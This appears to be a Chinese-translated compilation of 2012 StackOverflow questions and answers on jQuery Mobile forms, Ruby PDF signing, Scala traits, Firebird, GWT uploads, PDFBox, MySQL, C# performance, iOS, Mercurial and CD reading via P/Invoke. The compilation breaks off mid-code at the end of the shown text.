# StackOverflow 问答 12078000-12078999

# android - android Phonegap Jquery Mobile ajax 表单提交

> ID：12078005
> 
> 赞同：0
> 
> 时间：2012-08-22T17:02:44.870
> 
> 标签：android, jquery, mobile, cordova

我是 Jquery Mobile 的新手，我有使用 HTML5 作为显示创建的登录表单

```
<div data-role="content" class="content-min-height">
    <form name="frm_login" id="frm_login" >
        <label>Email ID</label> 
        <input 
        type="text" 
        width="40" 
        data-theme="d" 
        name="email"
        />
        <label>Password</label> 
        <input type="Password" width="50" data-theme="d" name="pwd"/>
        <p class="tekmaz-p-center padding-add">
            <input type="submit" name="btn_login" value="Login" class="btn-width-a" id="login"/>
            </p>

    </form>
    <div data-role="content" id="display"></div>
</div> 
```

在我的 javascript 文件中是

```
 // JavaScript Document
        $( document ).bind( "mobileinit", function() {
          // Make your jQuery Mobile framework configuration changes here!

          $.mobile.allowCrossDomainPages = true;
        });

    $(document).ready(function() {

        $("#login").click(function(){
            ajFrmLogin();
            return false;
        });
    });
    function ajFrmLogin(){

        var datas = $("#frm_login").serialize();
        //var datas = {0:"ABS",1:"pwddd"};
        $.ajax({

              url: "http://mydomain.com/core/validate.php",
              data: datas,
              cache: false,
              dataType: 'jsonp',
              jsonp: 'jsoncallback',
              timeout: 5000,
              success: function(rtdata,status){
                  $("#display").html(rtdata.email);

              }
        });
   } 
```

这段代码在 android 模拟器中工作，但是当我把它放在实际的 android 设备上时，我不会得到任何结果，正如我在 android 模拟器中所期望的那样。

请帮我解决这个问题

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-25T20:39:06.850

而不是使用`$("#login").click(function()`尝试，

```
$('#frm_login').submit(function(){
   ajFrmLogin();
}); 
```

*   还要检查在您的 html 中正确排序的 javascript 文件。

# ruby - 将数字签名插入现有的 pdf 文件

> ID：12078006
> 
> 赞同：13
> 
> 时间：2012-08-22T17:02:47.583
> 
> 标签：ruby, pdf, digital-signature

我需要使用 Rails 应用程序服务器将数字签名插入到现有的 pdf 文件中。（基本上，客户端上传 pdf 文件，服务器使用本地证书对其进行签名）

我一直在使用 JSignpdf 将数字签名插入到 pdf 文件中，并开始为 ruby​​ 寻找 gem ......

我在 ruby​​pdf 网站[http://soft.rubypdf.com/software/pdf-digital-signe](http://soft.rubypdf.com/software/pdf-digital-signe)上找到了另一个可移植的文件来完成这项工作，但在 ruby​​ 中找不到任何 gem 甚至示例代码来执行此操作。

我还查看了[使用 OpenSSL 进行数字签名验证](https://stackoverflow.com/questions/1999096/digital-signature-verification-with-openssl)，但无法理解如何使用本地证书文件实际签署已经存在的文档。

我还在[http://code.google.com/p/origami-pdf/](http://code.google.com/p/origami-pdf/)上达到了顶峰，但这对于一个所谓的“简单”（至少在概念上）任务来说似乎有点苛刻。

有什么想法/建议吗？

谢谢

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-08-29T11:05:26.847

经过一些研究，反复[阅读 OpenSSL 文档](http://www.ruby-doc.org/stdlib-1.9.3/libdoc/openssl/rdoc/OpenSSL.html)并探索[Origami 解决方案](http://code.google.com/p/origami-pdf/)，我构建了下面的代码，并设法将本地生成的签名/证书插入到 pdf 文档中。现在我只需要弄清楚如何将它与外部生成的证书一起使用（查看下面的版本 2，我在其中解决了它）。我打开了一个新[问题](https://stackoverflow.com/questions/12162975/openssl-not-enough-data)，您可以在其中找到有关我在使用 OpenSSL 和[DER 编码](https://support.ssl.com/index.php?/Knowledgebase/Article/View/19)证书时遇到的困难的一些详细信息。

为了开发第 2 版，我还花了一些时间想知道如何添加注释——以便签名在 Adob​​e 阅读器中变得可见——而不向文档添加新页面。从[折纸文档](http://rubydoc.info/gems/origami/1.2.3/Origami/PDF#append_page-instance_method)中，我找到了 get_page 方法，它解决了我最后一个问题。我正在使用 Adob​​e Reader X，作为记录。

希望你会发现这很有用;-)。

**版本 1 - 生成证书和密钥文件，并将它们直接插入到文档中**

```
require 'openssl'

begin
  require 'origami'
rescue LoadError
  ORIGAMIDIR = "C:\RailsInstaller\Ruby1.9.3\lib\ruby\gems\1.9.1\gems\origami-1.2.4\lib"
  $: << ORIGAMIDIR
  require 'origami'
end
include Origami

# Code below is based on documentation available on
# http://www.ruby-doc.org/stdlib-1.9.3/libdoc/openssl/rdoc/OpenSSL.html
key = OpenSSL::PKey::RSA.new 2048

open 'private_key.pem', 'w' do |io| io.write key.to_pem end
open 'public_key.pem', 'w' do |io| io.write key.public_key.to_pem end

cipher = OpenSSL::Cipher::Cipher.new 'AES-128-CBC'
pass_phrase = 'Origami rocks'

key_secure = key.export cipher, pass_phrase

open 'private_key.pem', 'w' do |io|
  io.write key_secure
end

#Create the certificate

name = OpenSSL::X509::Name.parse 'CN=nobody/DC=example'

cert = OpenSSL::X509::Certificate.new
cert.version = 2
cert.serial = 0
cert.not_before = Time.now
cert.not_after = Time.now + 3600

cert.public_key = key.public_key
cert.subject = name

OUTPUTFILE = "test.pdf"

contents = ContentStream.new.setFilter(:FlateDecode)
contents.write OUTPUTFILE,
  :x => 350, :y => 750, :rendering => Text::Rendering::STROKE, :size => 30

pdf = PDF.read('Sample.pdf')

# Open certificate files

#sigannot = Annotation::Widget::Signature.new
#sigannot.Rect = Rectangle[:llx => 89.0, :lly => 386.0, :urx => 190.0, :ury => 353.0]

#page.add_annot(sigannot)

# Sign the PDF with the specified keys
pdf.sign(cert, key, 
  :method => 'adbe.pkcs7.sha1',
  #:annotation => sigannot, 
  :location => "Portugal", 
  :contact => "myemail@email.tt", 
  :reason => "Proof of Concept"
)

# Save the resulting file
pdf.save(OUTPUTFILE) 
```

**版本 2 - 使用现有证书签署 pdf 文档**

```
require 'openssl'

begin
  require 'origami'
rescue LoadError
  ORIGAMIDIR = "C:\RailsInstaller\Ruby1.9.3\lib\ruby\gems\1.9.1\gems\origami-1.2.4\lib"
  $: << ORIGAMIDIR
  require 'origami'
end
include Origami

INPUTFILE = "Sample.pdf"
@inputfile = String.new(INPUTFILE)
OUTPUTFILE = @inputfile.insert(INPUTFILE.rindex("."),"_signed")
CERTFILE = "certificate.pem"
RSAKEYFILE = "private_key.pem"
passphrase = "your passphrase"

key4pem=File.read RSAKEYFILE

key = OpenSSL::PKey::RSA.new key4pem, passphrase
cert = OpenSSL::X509::Certificate.new(File.read CERTFILE)

pdf = PDF.read(INPUTFILE)
page = pdf.get_page(1)

# Add signature annotation (so it becomes visibles in pdf document)

sigannot = Annotation::Widget::Signature.new
sigannot.Rect = Rectangle[:llx => 89.0, :lly => 386.0, :urx => 190.0, :ury => 353.0]

page.add_annot(sigannot)

# Sign the PDF with the specified keys
pdf.sign(cert, key, 
  :method => 'adbe.pkcs7.sha1',
  :annotation => sigannot, 
  :location => "Portugal", 
  :contact => "myemail@email.tt", 
  :reason => "Proof of Concept"
)

# Save the resulting file
pdf.save(OUTPUTFILE) 
```

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2012-08-23T03:02:42.407

如果您正在从事付费项目，您可能需要考虑[jPDFSecure](https://www.qoppa.com/pdfsecure/)，这是一个商业 Java 库，专为开发人员对 PDF 文档进行数字签名和更改 PDF 文档的安全设置而构建。使用 jPDFSecure，您的应用程序或 Java 小程序可以加密 PDF 文档、设置权限和密码，以及创建和应用数字签名。jPDFSecure 针对性能进行了优化，并建立在 Qoppa 的专有 PDF 技术之上，因此不需要任何第三方软件或驱动程序。

jPDFSecure 有一个简单的界面，可以从文件、网络驱动器、URL 甚至输入流中加载 PDF 文档，这些文件可以在运行时生成或直接来自数据库。更改安全设置后，jPDFSecure 可以在 Java EE 应用服务器中运行时将文档保存到文件、java.io.OutputStream 或 javax.servlet.ServletOutputStream 以将文件直接输出到浏览器。

jPDFSecure 独立于平台，可用于任何支持 Java 的环境，包括 Windows、Mac OSX 和 Linux。

# eclipse - 如何使特征可用于对象

> ID：12078007
> 
> 赞同：0
> 
> 时间：2012-08-22T17:02:49.070
> 
> 标签：eclipse, scala

我正在从 Martin Odersky 的“Scala 编程”一书中学习 Scala。在他的“包和导入”一章中，Martin 举了一个例子，他在其中演示了导入子句的工作原理。为了测试我对 Scala 中 import 子句的理解，我在 Scala 透视图下的 Eclipse 中创建了一个名为 Vegetable.scala 的源文件。此代码与 Martin 的代码相同，只是我将 trait 的名称从 Fruit 更改为 Vegetable 以及名称从水果到蔬菜的对象）。下面是蔬菜.scala的代码

```
package com.att.scala
import java.awt.Color

trait Vegetable {
  val name: String
  val color: Color
}

object Vegetables {
   object Asparagus extends Vegetable { } 
   object Shallot extends Vegetable { }
   object Cauliflower extends Vegetable { }
   object Spinach extends Vegetable { }
   val veggiePlatter = List(Asparagus, Shallot)
} 
```

* * *

这些是我的发现： Eclipse 不想编译这段代码。它说：“不可能创建对象，因为：java.awt.Color 类型的特征蔬菜中的值颜色未定义字符串类型的特征蔬菜中的值名称未定义”

我希望从这段代码中完成的是理解为什么会发生这个错误。我怎样才能使蔬菜可用于反对芦笋、青葱和花椰菜？在这一点上，我相当（天真）的理解是，由于蔬菜和蔬菜出现在同一个包和同一个源文件中，因此特性蔬菜应该对对象 Asparagus （扩展蔬菜）是可见的。

在我以这种方式使用特征之前，我是否需要了解某个特征的具体内容？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-22T17:12:03.587

您缺少对象的实现。这应该有效：

```
package com.att.scala
import java.awt.Color

trait Vegetable {
  val name: String
  val color: Color
}

object Vegetables {
   object Asparagus extends Vegetable { 
       name = "Asparagus"
       color = new Color(255,255,255)
   } 
   //...
} 
```

没有值的 val 声明类似于 Java 中的抽象方法，因为它们需要一个“实现”，即一个值。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-22T17:13:02.900

问题不在于可见性 - 它无法编译，因为`Asparagus`etc 没有为`extends Vegetable`需要它们的字段提供值。您想要的每个对象都`extends Vegetable`必须提供一个`name`和`color`值。

以下编译得很好：

```
trait Vegetable {
    val name: String
    val color: String
}

object Vegetables {
    object Asparagus extends Vegetable {
        val name = "Asparagus"
        val color = "Green"
    }
} 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-22T17:13:32.863

如错误所示，您没有为特征中定义的名称或颜色变量提供任何值。

您可以提供默认值，例如：

```
trait Vegetable {
  val name: String = "Some Vegetable"
  val color: Color = Color.GREEN
} 
```

但是，除非您覆盖它，否则这将为每个对象产生相同的值。要为每个对象定义，您需要执行以下操作：

```
object Asparagus extends Vegetable { 
  val name = "Asparagus"
  val color = Color.GREEN
} 
```

# c# - Firebird 2.5 DB - 如何将多个应用程序连接到同一个 .FDB 文件？

> ID：12078009
> 
> 赞同：4
> 
> 时间：2012-08-22T17:02:55.120
> 
> 标签：c#, firebird

我需要火鸟专家的建议。我有一个 .FDB 文件。我需要两个 C# 程序才能同时使用这个数据库文件。已经尝试过： - 为每个程序创建一个单独的用户（给出错误“文件已被使用”） - 确保我安装了适用于 Windows 的 Superserver 版本（给出相同的错误） - 在 C# 中使用“使用”语句（有助于文件，我认为它可以帮助 .FDB，但没有）

这很令人困惑，因为我在 Internet 上看到可以同时连接 1024 个或更多用户。可能这意味着它们都应该在一个应用程序中。但是如何将两个应用程序连接到同一个文件？

谢谢你的时间。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-22T18:43:43.203

如果连接是由同一个 Firebird 服务器完成的，您可以使用 SuperServer 从不同的应用程序进行连接（如果它们使用不同的端口，您可以同时运行 1 个以上的 Firebird 服务器）。连接来自相同或不同的用户并不重要。

确保您只有 1 个 Firebird SuperServer 正在运行（或者如果您有更多，请确保与该数据库的连接是通过单个 Firebird Server 实例完成的），并确保您使用的是正确的 fbclient.dll（不是旧的嵌入式以独占模式打开数据库的版本）。

# gwt - formpanel.submit 不在 GWT 服务器上提交文件

> ID：12078010
> 
> 赞同：1
> 
> 时间：2012-08-22T17:02:59.137
> 
> 标签：gwt, gwt2, formpanel

我想将文件从客户端发送到服务器。

我的代码：

**客户端**：

```
private FormPanel getFormPanel() {
    if (formPanel == null) {
        formPanel = new FormPanel();
    formPanel.setMethod(FormPanel.METHOD_POST);
        formPanel.setEncoding(FormPanel.ENCODING_MULTIPART);
        formPanel.setAction(GWT.getHostPageBaseURL() +"UploadFileServlet");
        formPanel.setWidget(getFlexTable_1());

                System.out.println(GWT.getHostPageBaseURL() +"UploadFileServlet");
    }
    return formPanel;
} 
```

**在`getFlexTable_1()`**

```
flexTable.setWidget(1, 1, getFileUpload()); 
```

**在`getFileUpload()`**

```
private FileUpload getFileUpload() {
    if (fileUpload == null) {
        fileUpload = new FileUpload();
        fileUpload.setName("upload");
    }
    return fileUpload;
}

private Button getAddButton() {
        if (addButton == null) {
            addButton = new Button("ADD");
            addButton.addClickHandler(new ClickHandler() {
                public void onClick(ClickEvent event) {
                               formPanel.submit();
        }
        });
    }
return addButton; 
```

}

**在服务器端**

```
public class CmisFileUpload extends HttpServlet implements Servlet{

    protected void doGet(HttpServletRequest request,
            HttpServletResponse response) throws ServletException, IOException {
        doPost(request, response);
    }

    protected void doPost(HttpServletRequest request,
            HttpServletResponse response) throws ServletException, IOException {

        byte[] buffer = new byte[115200];//
        String fileName = null;
        String mimetype = null;
        String majorVersion = null;
        InputStream stream = null;
        System.out.println("ServletWorking Fine");
} 
```

**现在，当我选择一个文件并单击添加按钮时，我无法在服务器端看到此代码的输出`System.out.println("ServletWorking Fine");`**

`System.out.println(GWT.getHostPageBaseURL() +"UploadFileServlet");`客户端的输出是

```
http://127.0.0.1:8888/UploadFileServlet 
```

当我直接在浏览器上使用这个 url 时，我得到了服务器端的输出`System.out.println("ServletWorking Fine");`**

* * *

**已编辑**

我又创建了一个用于文件上传的 Web 应用程序

```
public class Uploadfile implements EntryPoint {

    FormPanel uploadForm = new FormPanel();
    public void onModuleLoad() {

        HorizontalPanel horizontalPanel = new HorizontalPanel();

      uploadForm.setAction(GWT.getHostPageBaseURL() +"UploadFileServlet"); 

        uploadForm.setEncoding(FormPanel.ENCODING_MULTIPART); 
        uploadForm.setMethod(FormPanel.METHOD_POST); 
        horizontalPanel.add(uploadForm);

        // Create a panel to hold all of the form widgets. 
        VerticalPanel panel = new VerticalPanel(); 
        uploadForm.setWidget(panel); 

        FlexTable flexTable = new FlexTable();
        panel.add(flexTable);

        // Create a FileUpload widget. 
        FileUpload upload = new FileUpload(); 
        upload.setName("uploadFormElement"); 
        flexTable.setWidget(2, 3, upload);
        // panel.add(upload); 

        // Add a 'submit' button. 
        Button uploadSubmitButton = new Button("Submit"); 
        panel.add(uploadSubmitButton); 

        uploadSubmitButton.addClickHandler(new ClickHandler() {

            public void onClick(ClickEvent event) {
                // TODO Auto-generated method stub
                 uploadForm.submit(); 
            }
        });
        uploadForm.addFormHandler(new FormHandler() { 
          public void onSubmit(FormSubmitEvent event) { 
          } 
          public void onSubmitComplete(FormSubmitCompleteEvent event) { 
            Window.alert(event.getResults()); 
          } 
        }); 
        RootPanel.get().add(horizontalPanel); 
    }
} 
```

**服务器**

```
protected void doGet(HttpServletRequest request, 
            HttpServletResponse response) 
                            throws ServletException, IOException { 
      doPost(request, response);
  }

  protected void doPost(HttpServletRequest request, 
            HttpServletResponse response) 
                            throws ServletException, IOException { 

      System.out.println("working fine" );
   } 
```

此代码工作正常

在我看来，代码之间没有区别。

请告诉我为什么 formpanel.submit 不能正常工作。

请帮忙。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-23T15:56:48.457

方法是`hide()`关闭窗口？？？如果是，那么

`hide();`之后删除移动代码`formPanel.submit();`

供`hide()`使用`FormHandler`。例如

```
uploadForm.addFormHandler(new FormHandler() {

    public void onSubmitComplete(FormSubmitCompleteEvent event) {
        hide();
    }

    public void onSubmit(FormSubmitEvent event) {

    }

}); 
```

原因：`FormPanel`不能分离（即从其父级中移除，直到提交完成。否则，提交通知将失败。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-23T05:30:54.540

为什么您为文件上传映射了 GET 方法。GET 请求方法为在浏览器中输入的 url 服务。删除 GET 请求映射，它将起作用。

对于 POST 请求映射，您可以将 MultipartFile 用于 RequestParam，如下所示

```
protected void uploadFileAndReconcilePayout1(@RequestParam("documentUpload") MultipartFile file, HttpServletRequest request, HttpServletResponse response) throws IOException {
        //code for file working

    } 
```

# java - 使用 PDFBox 和 Swing 显示嵌入的字体

> ID：12078014
> 
> 赞同：1
> 
> 时间：2012-08-22T17:03:06.930
> 
> 标签：java, pdfbox

我正在使用 PDFBox 在 JInternalFrame 中显示 PDF 文件。打开 PDF 时，我收到很多这样的警告：

```
Changing font on <m> from <Tahoma Negrita> to the default font 
```

我知道所报告的字体不是标准的 14 种字体集的一部分。所以我决定检查这些字体是否嵌入在 PDF 文件中（认为加载嵌入字体应该没有问题，对吧？）。

所以我在不同的阅读器上打开文件并检查属性/字体。我怀疑此部分是否报告文档所需的字体或文档中实际嵌入的字体。

我得到的信息如下：

```
BAAAA+Tahoma-Bold (embedded Subset), type:TrueType, Encoding:
CAAAA+Tahoma (Embedded Subset), type:TrueType, Encoding: 
```

对此感到困惑，我研究了如何从 OpenOffice 嵌入字体，发现应该选中 PDF/A-1a 选项。因此，我使用此选项制作了另一个 PDF（以防在制作原始 PDF 文件时未使用此选项），但我得到了相同的结果。

我希望您的指导了解这是如何工作的。我希望能够像 PDF 阅读器一样打开 PDF 文件。我还阅读了有关 PDFBox_External_Fonts.properties 的信息，但我猜这个文件不应该被修改，因为我正在处理嵌入字体。

谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-23T08:05:40.357

pdfbox 无法解析 TrueType 字体的嵌入子集。

据我了解，嵌入式 TrueType 子集缺少 pdfbox 需要的字体文件的一些元数据。

该错误是已知的，但不容易解决。现在我只能建议尽可能使用嵌入式 Type 1 字体，pdfbox 可以处理它们。

您还可以尝试在 org/apache/pdfbox/resources/PDFBox_External_Fonts.properties 下的 pdfbox.jar 中设置完整字体文件的路径，因此如果 pdfbox 无法解析子集，至少它可以找到原始的完整路径字体文件。也许这行得通，但我还没有测试过。

祝你好运！

# mysql - 通过终端将数据库导入 MAMP，无法连接

> ID：12078017
> 
> 赞同：1
> 
> 时间：2012-08-22T17:03:13.817
> 
> 标签：mysql, svn, terminal, phpmyadmin

在轻率地尝试将大型数据库（84mb）导入 PHPMyAdmin（尝试增加内存限制、超时限制）之后，我尝试通过终端/命令行导入数据库，但被拒绝访问 MySQL 数据库。

我在这里尝试了该方法：http: [//nickhardeman.com/308/export-import-large-database-using-mamp-with-terminal/](http://nickhardeman.com/308/export-import-large-database-using-mamp-with-terminal/)

我尝试了 root 用户/密码，我尝试创建一个具有完全数据库访问权限的新用户，但仍然没有运气。收到这些错误：

```
YI:trunk mpfefferle$ /applications/MAMP/library/bin/mysql -u [root] -p [mydbase]
Enter password: 
ERROR 1045 (28000): Access denied for user 'root'@'localhost' (using password: YES)

bash-3.2# /applications/MAMP/library/bin/mysql -u [admin] -p [mydbase]
Enter password: 
ERROR 1045 (28000): Access denied for user '[admin]'@'localhost' (using password: YES) 
```

我完全无计可施。我想做的只是从 SVN 存储库中检查该站点的工作副本，但我需要 mysql 数据库才能运行/编辑/测试该站点，以便更新 Magento，以便添加新功能以便出售一些糟糕的新产品。我准备完全放弃 Web 开发。我讨厌它，我希望互联网永远消失。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T18:27:25.850

ID-10T 错误：我没有从我试图执行的命令中删除括号。`/applications/MAMP/library/bin/mysql -u root -p mydbase`代替`/applications/MAMP/library/bin/mysql -u [root] -p [mydbase]`

# jquery - 由于宽度和高度错误，jScrollPane 无法正确初始化

> ID：12078019
> 
> 赞同：0
> 
> 时间：2012-08-22T17:03:13.970
> 
> 标签：jquery, css, jquery-jscrollpane

请看这个页面。我挣扎了几个小时才明白出了什么问题。但没有成功。点击公司历史。文本应该是可滚动的。有足够的文本可以滚动。

[http://test.dhmdesign.com/studio/about/overview](http://test.dhmdesign.com/studio/about/overview)

jScrollPane 在 ajaxComplete 事件中的 custom.js 中初始化。

我认为 jScrollPane 没有正确检测宽度和高度，结果是 isScrollableV - false （在 jScrollPane 插件中）。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-23T03:25:34.370

通过在这里和那里添加几个换行符，我注意到您在弹出窗口出现之前初始化了 jScrollPane。

由于内容尚未出现在屏幕上，jscrollpane 无法获取文本的高度，因此不显示滚动条。

我以前遇到过类似的问题

您可以尝试显示弹出窗口然后初始化 jscollpane 吗？

# c# - 性能和静态方法与公共方法

> ID：12078021
> 
> 赞同：1
> 
> 时间：2012-08-22T17:03:20.397
> 
> 标签：c#, performance, static-methods

我有一个辅助方法，它需要一个开始日期和一个结束日期，并通过某些业务逻辑产生一个整数结果。对于给定的数据集，此帮助方法有时会被调用超过 10,000 次（尽管这种情况并不经常发生）。

**问题：** 仅考虑性能，将此辅助方法作为某个辅助类的静态方法更有效，还是将辅助方法作为类的公共方法更有益？

静态方法示例：

```
// an iterative loop
foreach (var result in results) {
    int daysInQueue = HelperClass.CalcDaysInQueue(dtBegin, dtEnd);
} 
```

公共成员方法示例：

```
// an iterative loop
HelperClass hc = new HelperClass();
foreach (var result in results) {
    int daysInQueue = hc.CalcDaysInQueue(dtBegin, dtEnd);
} 
```

在此先感谢您的帮助！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T17:07:51.793

当您调用实例方法时，编译器总是不可见地传递一个额外的参数，该参数在该方法中的`this`名称下可用。`static`方法不代表任何对象调用，因此它们没有`this`引用。

我认为将实用程序方法标记为的好处很少`static`：

*   *小的* **性能**`this`改进，您无需为您不真正使用的参考付费。但是，我怀疑您是否会看到差异。

*   **方便**`static`- 您可以随时随地调用方法，编译器不会强制您提供对象的实例，而该方法并不真正需要

*   **可读性**：实例方法应该对实例的状态进行操作，而不仅仅是对参数进行操作。如果它是一个不需要实例工作的实例方法，那就令人困惑了。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-22T17:42:21.783

这里的性能差异实际上没什么。您将很难实际测量时间差异（并克服 CPU 上发生的其他事情的“噪音”），这将是多么小。

除非你碰巧去执行一大堆数据库查询或从对象构造函数中的文件中读取几 GB 的信息（我在这里假设它只是空的），否则它将具有相当小的成本，因为它脱离了循环，根本无法扩展。

您应该根据逻辑上的意义做出此决定，而不是基于性能，直到您有充分的理由相信通过违反标准实践/可读性/等可以获得显着且必要的性能提升。

在这种特殊情况下，您的操作在逻辑上是“静态的”。没有使用状态，因此不需要对象的实例，因此应该将方法设为静态。其他人说它可能表现更好，这很可能是真的，但这不应该是你让它静态的原因。如果该操作作为实例方法在逻辑上是有意义的，那么您不应该试图将其强制为静态方法，只是为了让它运行得更快；这是在这里学习错误的教训。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-22T17:08:01.683

只需对其进行基准测试:)理论上静态方法应该更快，因为它省去了虚拟调用开销，但在您的情况下这种开销可能并不重要（但我什至不确定该示例使用哪种语言）。只需用足够多的迭代次数对两个循环进行计时，以便花一分钟左右的时间亲眼看看。请确保您使用非平凡数据，以便您的编译器不会优化调用。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-22T17:08:36.833

根据我的理解，将其设为静态方法对性能更有利。这意味着没有创建对象的实例，尽管我认为性能差异可以忽略不计。如果每次调用静态函数时不需要重新创建一些数据，这些数据可以存储在类对象中，就会出现这种情况。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-23T09:41:08.197

你说'只考虑性能'。在这种情况下，你应该完全专注于里面的东西

HelperClass.CalcDaysInQueue(dtBegin, dtEnd);

而不是调用该例程所花费的 0.0001% 的运行时间。如果它是一个简短的例程，JIT 编译器无论如何都会内联它，在这种情况下，静态方法和实例方法之间不会有性能差异。

# iphone - 我不应该对 UIViewController 属性使用（非原子，弱）吗？

> ID：12078027
> 
> 赞同：0
> 
> 时间：2012-08-22T17:03:41.997
> 
> 标签：iphone, objective-c, ios, automatic-ref-counting

我在我的一个对象上有一个属性，如下所示：

```
@property(nonatomic, weak) UIViewController *myParentViewController; 
```

但是，在[ARC 发行说明中](http://developer.apple.com/library/mac/#releasenotes/ObjectiveC/RN-TransitioningToARC/Introduction/Introduction.html)它说：

> 注意：此外，在 OS X v10.7 中，您不能创建对 NSFontManager、NSFontPanel、NSImage、NSTableCellView、NSViewController、NSWindow 和 NSWindowController 实例的弱引用。此外，在 OS X v10.7 中，AV Foundation 框架中没有类支持弱引用。

所以我将属性`assign`改为，但是现在当我输入 时`myParentViewController`，自动完成显示它是`unsafe_unretained`，这让我有点害怕。

这里到底发生了什么？使用 unsafe_unretained 我应该注意什么？我是否正确解释了文档？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T17:13:43.950

`UIViewController`不在该列表中，无论如何它仅指 OS X。您误解了文档。适用于 OS X 的东西在 iOS 中不一定具有直接等效性。

# mercurial - Mercurial push 在合并后创建新的远程头

> ID：12078029
> 
> 赞同：4
> 
> 时间：2012-08-22T17:03:49.783
> 
> 标签：mercurial, merge

我有两个存储库：A（我的树干）和 B（用于构建新功能的 A 的克隆）。我一直在 repo B 中做一些工作，我想用 repo A 中的更改来更新它。我已经将更改从 A 拉到 B 并经历了更新/合并舞蹈，并准备将合并的更改推送到 repo B在我的服务器上。当我尝试推送这些更改时，它告诉我我将创建一个新的远程头。

当我运行时，`hg heads`我在本地只有一个用于 repo B 的头。当我检查时，`hg branches`我在 repo B 中只有默认分支，这就是我想要的。我已经尝试再次更新/合并，但它无法合并祖先，所以我的想法很新鲜。我真的应该强迫推动，因为我当地的一切看起来都很干净吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-22T17:09:01.280

你说你已经试过了`updating / merging again`，但我认为你需要`pull / merge`再试一次。如果您只有一个本地头并且您`push`将创建额外的远程头，那么自从您开始“更新/合并舞会”以来，很可能已经有新的头被推送到远程

# .net - 用于读取 ISRC 的 PInvoke DeviceIOControl 不返回数据

> ID：12078032
> 
> 赞同：0
> 
> 时间：2012-08-22T17:04:03.670
> 
> 标签：.net, winapi, pinvoke, ioctl, cd

我正在使用 Idael Cardoso 的示例 Win32Functions 类与 CD-Drive 进行交互。我想阅读托盘中 CD 的 ISRC 代码。

首先是一些代码 - 这是 Win32Functions 类 - 我添加了希望正确的代码来读取 cd 的 Q_CHANNEL，一些 C++ 结构在这里找到（[http://msdn.microsoft.com/en-us/library/windows/hardware/ ff567601%28v=vs.85%29.aspx](http://msdn.microsoft.com/en-us/library/windows/hardware/ff567601%28v=vs.85%29.aspx)）并试图将它们转换为 C#。最后，我添加了一个调用 DeviceIOControl 来读取轨道的 ISRC 代码：

```
 namespace MyISRCReader
    {
  /// <summary>
  /// Wrapper class for Win32 functions and structures needed to handle CD.
  /// </summary>
  internal class Win32Functions
  {   
    public enum DriveTypes:uint 
    {
      DRIVE_UNKNOWN = 0,
      DRIVE_NO_ROOT_DIR,
      DRIVE_REMOVABLE,
      DRIVE_FIXED,
      DRIVE_REMOTE,
      DRIVE_CDROM,
      DRIVE_RAMDISK
    };

    [System.Runtime.InteropServices.DllImport("Kernel32.dll")]
    public extern static DriveTypes GetDriveType(string drive);

    //DesiredAccess values
    public const uint GENERIC_READ      = 0x80000000;
    public const uint GENERIC_WRITE     = 0x40000000;
    public const uint GENERIC_EXECUTE   = 0x20000000;
    public const uint GENERIC_ALL       = 0x10000000;

    //Share constants
    public const uint FILE_SHARE_READ   = 0x00000001;  
    public const uint FILE_SHARE_WRITE  = 0x00000002;  
    public const uint FILE_SHARE_DELETE = 0x00000004;  

    //CreationDisposition constants
    public const uint CREATE_NEW        = 1;
    public const uint CREATE_ALWAYS     = 2;
    public const uint OPEN_EXISTING     = 3;
    public const uint OPEN_ALWAYS       = 4;
    public const uint TRUNCATE_EXISTING = 5;

    /// <summary>
    /// Win32 CreateFile function, look for complete information at Platform SDK
    /// </summary>
    /// <param name="FileName">In order to read CD data FileName must be "\\.\\D:" where D is the CDROM drive letter</param>
    /// <param name="DesiredAccess">Must be GENERIC_READ for CDROMs others access flags are not important in this case</param>
    /// <param name="ShareMode">O means exlusive access, FILE_SHARE_READ allow open the CDROM</param>
    /// <param name="lpSecurityAttributes">See Platform SDK documentation for details. NULL pointer could be enough</param>
    /// <param name="CreationDisposition">Must be OPEN_EXISTING for CDROM drives</param>
    /// <param name="dwFlagsAndAttributes">0 in fine for this case</param>
    /// <param name="hTemplateFile">NULL handle in this case</param>
    /// <returns>INVALID_HANDLE_VALUE on error or the handle to file if success</returns>
    [System.Runtime.InteropServices.DllImport("Kernel32.dll", SetLastError=true)]
    public extern static IntPtr CreateFile(string FileName, uint DesiredAccess, 
      uint ShareMode, IntPtr lpSecurityAttributes, 
      uint CreationDisposition, uint dwFlagsAndAttributes,
      IntPtr hTemplateFile);

    /// <summary>
    /// The CloseHandle function closes an open object handle.
    /// </summary>
    /// <param name="hObject">Handle to an open object.</param>
    /// <returns>If the function succeeds, the return value is nonzero. If the function fails, the return value is zero. To get extended error information, call GetLastError.</returns>
    [System.Runtime.InteropServices.DllImport("Kernel32.dll", SetLastError=true)]
    public extern static int CloseHandle(IntPtr hObject);

    public const uint IOCTL_CDROM_READ_TOC         = 0x00024000;
    public const uint IOCTL_STORAGE_CHECK_VERIFY   = 0x002D4800;
    public const uint IOCTL_CDROM_RAW_READ         = 0x0002403E;
    public const uint IOCTL_STORAGE_MEDIA_REMOVAL  = 0x002D4804;
    public const uint IOCTL_STORAGE_EJECT_MEDIA    = 0x002D4808;
    public const uint IOCTL_STORAGE_LOAD_MEDIA     = 0x002D480C;
    public const uint IOCTL_CDROM_READ_Q_CHANNEL   = 0x0002402C;  // found here: http://mu97bot.googlecode.com/svn-history/r2/trunk/Include/WinAPIEx.au3
                                                                  // and here:   http://www.ioctls.net/

    /// <summary>
